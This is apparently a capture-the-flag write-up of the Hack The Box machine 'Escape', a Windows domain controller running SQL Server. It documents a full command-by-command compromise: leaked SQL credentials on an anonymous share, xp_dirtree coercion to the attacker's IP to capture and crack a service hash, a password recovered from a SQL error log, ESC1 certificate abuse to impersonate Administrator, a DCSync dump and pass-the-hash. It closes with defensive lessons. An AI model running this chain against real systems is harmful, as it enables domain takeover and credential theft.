# HTB: Escape

**Difficulty:** Medium **OS:** Windows Server 2019 (Active Directory, AD CS) **Target IP:** 10.129.228.253 **Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

```
nmap -sCV -T4 10.129.228.253 -p <ports> -oA nmap/nmap
```

```
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
636/tcp   open  ldapssl?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp  open  ldap
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf
```

```
ms-sql-ntlm-info:
    Target_Name: sequel
    NetBIOS_Domain_Name: sequel
    NetBIOS_Computer_Name: DC
    DNS_Domain_Name: sequel.htb
    DNS_Computer_Name: dc.sequel.htb
```

The Kerberos/LDAP/9389 combination confirmed this is an Active Directory Domain Controller (domain `sequel.htb`), and the NTLM info leak from the MS-SQL banner confirmed the box also runs **Microsoft SQL Server 2019** directly on the DC itself — an unusual but not uncommon setup, and immediately notable because SQL Server accounts on a DC are a well-known pivot point into the domain.

nmap also flagged a large clock skew (~8 hours) between my Kali box and the target. Kerberos is strict about clock drift (normally a 5-minute tolerance), so before doing anything Kerberos-related I synced my clock against the DC:

```
ntpdate 10.129.228.253
```

I also added `dc.sequel.htb` / `sequel.htb` to `/etc/hosts`, since AD environments are hostname-sensitive for Kerberos and LDAP operations.

---

## 2. Foothold — Leaked SQL Credentials in a Public Share

### 2.1 Anonymous SMB Enumeration

```
smbclient -L //10.129.228.253/ -N
```

```
Public          Disk
```

Alongside the standard administrative and SYSVOL/NETLOGON shares, a **`Public`** share stood out as non-default and worth checking anonymously.

```
smbclient //10.129.228.253/Public -N
get "SQL Server Procedures.pdf"
```

The PDF, clearly an internal onboarding document, directly stated:

> *"For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with user PublicUser and password GuestUserCantWrite1."*

This is a textbook case of a **well-intentioned convenience account leaking through an anonymously-readable file share** — a "look but don't touch" guest database account, with its plaintext password published in a document meant for new hires, sitting on a share requiring no authentication at all.

### 2.2 Validating and Using the Credential

```
nxc mssql sequel.htb -u PublicUser -p GuestUserCantWrite1 --local-auth
```

```
[+] DC\PublicUser:GuestUserCantWrite1
```

Confirmed — a valid, local (non-domain) SQL Server login. I connected interactively:

```
impacket-mssqlclient sequel.htb/PublicUser:'GuestUserCantWrite1'@10.129.228.253
```

---

## 3. Capturing a Service Account's NetNTLMv2 Hash via `xp_dirtree`

### 3.1 Forcing an Outbound SMB Authentication Attempt

Even with only a low-privilege, guest-level SQL login, MS SQL Server exposes the extended stored procedure **`xp_dirtree`**, which lists the contents of a filesystem path — including UNC paths. Pointing it at a UNC path I control forces the SQL Server's underlying Windows service account to authenticate to my machine over SMB, since Windows will try to resolve/browse the path using the service's own credentials:

```sql
EXEC master..xp_dirtree '\\10.10.15.146\share';
```

I had `responder` (or an equivalent SMB listener) running to capture the resulting authentication attempt, and it caught a full **NetNTLMv2** challenge/response for the account the SQL Server service actually runs as:

```
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:...
```

This is a classic and extremely reliable technique against MS SQL Server: any authenticated login — even a deliberately restricted "guest" account — can typically still call `xp_dirtree` (or `xp_fileexist`), and both are a one-line way to coerce NTLM authentication out of the SQL Server's service account, regardless of what SQL-level permissions that login otherwise has.

### 3.2 Cracking the Hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
REGGIE1234ronnie (sql_svc)
```

The captured NetNTLMv2 hash cracked quickly against `rockyou.txt`, recovering the plaintext password for the `sql_svc` **domain** service account.

### 3.3 Confirming WinRM Access

```
nxc winrm sequel.htb -u sql_svc -p REGGIE1234ronnie
```

```
[+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

`sql_svc` had WinRM rights — a full interactive shell.

---

## 4. Lateral Movement — Recovering Plaintext Credentials from a SQL Server Error Log

### 4.1 Exploring the SQL Server Install Directory

Once shelled in as `sql_svc` via Evil-WinRM, I looked through the SQL Server installation directory for anything left behind from setup or troubleshooting:

```
C:\SQLServer\Logs\ERRORLOG.BAK
```

Reading this backed-up error log (`Get-Content`) revealed two **failed logon attempts logged verbatim, including the plaintext password that was typed**, from when someone apparently fat-fingered credentials into a login prompt during setup or testing:

```
Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match...
Logon failed for user 'NuclearMosquito3'. Reason: Password did not match...
```

SQL Server error logs record failed logon attempts, and in **mixed-mode authentication** setups, a common operator mistake is typing the *password* into the *username* field (or vice versa) — which is exactly what happened here: `NuclearMosquito3` was logged as an attempted **username**, immediately following a failed attempt for the real username `Ryan.Cooper`. This is a strong signal that `NuclearMosquito3` is actually `Ryan.Cooper`'s real password, mistakenly submitted into the wrong field once.

### 4.2 Validating the Credential

```
nxc smb sequel.htb -u Ryan.Cooper -p NuclearMosquito3
```

```
[+] sequel.htb\Ryan.Cooper:NuclearMosquito3
```

Confirmed — a second, higher-value domain user account, reached purely by reading operational log noise left behind by a prior human mistake.

```
evil-winrm -i 10.129.228.253 -u Ryan.Cooper -p NuclearMosquito3
```

✅ Interactive shell as `Ryan.Cooper`, a real domain user with a proper AD identity (as opposed to `sql_svc`, a service account).

---

## 5. Privilege Escalation — AD CS Template Abuse (ESC1-style Certificate Impersonation)

### 5.1 Enumerating Certificate Templates with Certify

With Active Directory Certificate Services (AD CS) present (implied by ports 88/389 and the domain's PKI infrastructure), I uploaded **Certify** to check for misconfigured, exploitable certificate templates:

```powershell
upload Certify.exe
.\Certify.exe find /vulnerable
```

This flagged the **`UserAuthentication`** template as vulnerable, with the specific combination of settings that make certificate templates dangerous:

```
msPKI-Certificate-Name-Flag  : ENROLLEE_SUPPLIES_SUBJECT
Authorized Signatures Required : 0
Enrollment Rights : ... sequel\Domain Users ...
pkiextendedkeyusage : Client Authentication, ...
```

This is the signature of the classic **ESC1** AD CS misconfiguration:
- **`ENROLLEE_SUPPLIES_SUBJECT`** — the *requester*, not the CA or an administrator, gets to specify the Subject Alternative Name on the certificate they're issued.
- **Client Authentication EKU** — the resulting certificate can actually be used to authenticate as a user via Kerberos PKINIT, not just for signing/encryption purposes.
- **Domain Users can enroll** — any regular domain account, including `Ryan.Cooper`, is authorized to request this template.
- **No manager approval / signature requirement** — the certificate is issued immediately, no human review needed.

Put together: **any authenticated domain user can request a certificate and simply declare, in the request itself, that the certificate should authenticate as any other user** — including Administrator.

### 5.2 Requesting a Certificate Impersonating Administrator

```powershell
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

```
[*] CA Response : The certificate had been issued.
[*] Request ID  : 13
```

The CA issued a valid certificate with `Ryan.Cooper` as the enrolling identity but **`Administrator`** set as the Subject Alternative Name — exactly what ESC1 predicts, since the template let the requester dictate that field with zero validation against who they actually are.

### 5.3 Converting the Certificate for Use

I copied the returned PEM private key and certificate back to Kali and packaged them into a PKCS#12 (`.pfx`) bundle, the format Windows/Kerberos PKINIT tooling expects:

```bash
openssl pkcs12 -in cert.pem -keyex \
  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out cert.pfx
```

### 5.4 Requesting a TGT via PKINIT

Using `gettgtpkinit.py` (from the `PKINITtools`/minikerberos toolset), I exchanged the certificate directly for a Kerberos Ticket Granting Ticket — this is the core of how AD CS-based authentication works: PKINIT lets a certificate substitute for a password during the initial Kerberos AS-REQ:

```bash
python3 gettgtpkinit.py \
  -cert-pfx cert.pfx \
  -pfx-pass '<pfx_password>' \
  'sequel.htb/Administrator' \
  administrator.ccache
```

```
[*] AS-REP encryption key (you might need this later): 943ba444...
[*] Saved TGT to file
```

```
klist
```

```
Default principal: Administrator@SEQUEL.HTB
Valid starting  ...  Service principal: krbtgt/SEQUEL.HTB@SEQUEL.HTB
```

A fully valid TGT for **`Administrator`**, obtained without ever knowing the Administrator account's actual password — purely through the certificate template misconfiguration.

### 5.5 Dumping Domain Secrets

With the TGT loaded (`KRB5CCNAME`), I performed a full DCSync against the domain using Kerberos authentication (`-k -no-pass`):

```bash
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass 'sequel.htb/Administrator@dc.sequel.htb'
```

```
Administrator:500:...:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
...
[*] Kerberos keys grabbed
```

This dumped every domain account's NTLM hash and Kerberos keys directly from the NTDS store, including the Administrator's own NTLM hash — full domain compromise achieved via the certificate-derived TGT.

### 5.6 Confirming Full Compromise

```bash
evil-winrm -i 10.129.228.253 -u Administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```

✅ **Full compromise** — an interactive Administrator shell via pass-the-hash, using the NTLM hash recovered from the post-PKINIT DCSync.

---

## 6. Summary

| Stage | Technique |
|---|---|
| Recon | `nmap` → AD DC signature + MS SQL Server running directly on the DC |
| Foothold | Anonymous SMB access to a `Public` share leaked a PDF containing plaintext credentials for a low-privilege SQL guest account (`PublicUser`) |
| Coerced auth | Used `xp_dirtree` (available even to the guest login) to force the `sql_svc` domain service account to authenticate to a listener, capturing its NetNTLMv2 hash |
| Hash cracking | Cracked the hash with `john` + rockyou → `sql_svc` domain credentials, sufficient for WinRM |
| Lateral movement | Read a backed-up SQL Server error log (`ERRORLOG.BAK`) containing a real user's password, accidentally typed into the *username* field during a failed logon → recovered `Ryan.Cooper`'s real password |
| Privesc discovery | Used **Certify** to find the `UserAuthentication` AD CS template misconfigured for **ESC1** (enrollee-supplied SAN + Client Authentication EKU + broad enrollment rights + no approval required) |
| Privesc | Requested a certificate as `Ryan.Cooper` with SAN set to `Administrator`; exchanged it for a Kerberos TGT via PKINIT (`gettgtpkinit.py`) |
| Domain Admin | Used the Administrator TGT for a full DCSync (`impacket-secretsdump -k`), recovering the Administrator NTLM hash, then pass-the-hash for a full admin shell |

**Root cause / lessons learned:**

- Anonymous, unauthenticated SMB shares are a recurring source of credential leaks — even a share intended for "public onboarding documents" should never contain live, working passwords in plaintext.
- MS SQL Server's `xp_dirtree`/`xp_fileexist` extended stored procedures are enabled by default for most logins and provide a reliable way to coerce NTLM authentication from the server's own service account — this technique doesn't require `sysadmin` or any elevated SQL privilege, just the ability to run a query.
- SQL Server error logs (and Windows event logs generally) can retain plaintext passwords when an operator mistypes credentials into the wrong field during a failed logon — these logs should be treated as sensitive and access-restricted, not left readable to any authenticated user.
- AD CS certificate templates that let the **enrollee** supply the certificate's Subject Alternative Name, combined with a broad enrollment policy (e.g., Domain Users) and Client Authentication EKU, is one of the most severe and common AD misconfigurations (ESC1) — it converts "any domain user" into "any domain user, including Domain Admins," via a fully legitimate-looking certificate request. Templates should restrict `ENROLLEE_SUPPLIES_SUBJECT`, require manager approval for sensitive templates, and tightly scope enrollment rights.
- Certificate-based Kerberos authentication (PKINIT) doesn't require ever knowing a target account's password — a maliciously-issued certificate is functionally equivalent to full credential compromise for that account.

---

## 7. Tools Used

- `nmap`, `smbclient` — reconnaissance and anonymous share enumeration
- `nxc` (NetExec) — credential validation across MSSQL, WinRM, and SMB
- `impacket-mssqlclient` — authenticated SQL Server access and `xp_dirtree` coercion
- SMB listener (Responder or equivalent) — capturing the coerced NetNTLMv2 hash
- `john` (rockyou.txt) — cracking the captured NetNTLMv2 hash
- `evil-winrm` — interactive shell access across all three compromised identities
- **Certify** — AD CS template enumeration and certificate request (ESC1 exploitation)
- `openssl` — converting the issued PEM certificate/key into PKCS#12 format
- `gettgtpkinit.py` (PKINITtools / minikerberos) — exchanging the certificate for a Kerberos TGT via PKINIT
- `impacket-secretsdump` — DCSync-based domain credential dump using the Kerberos ticket
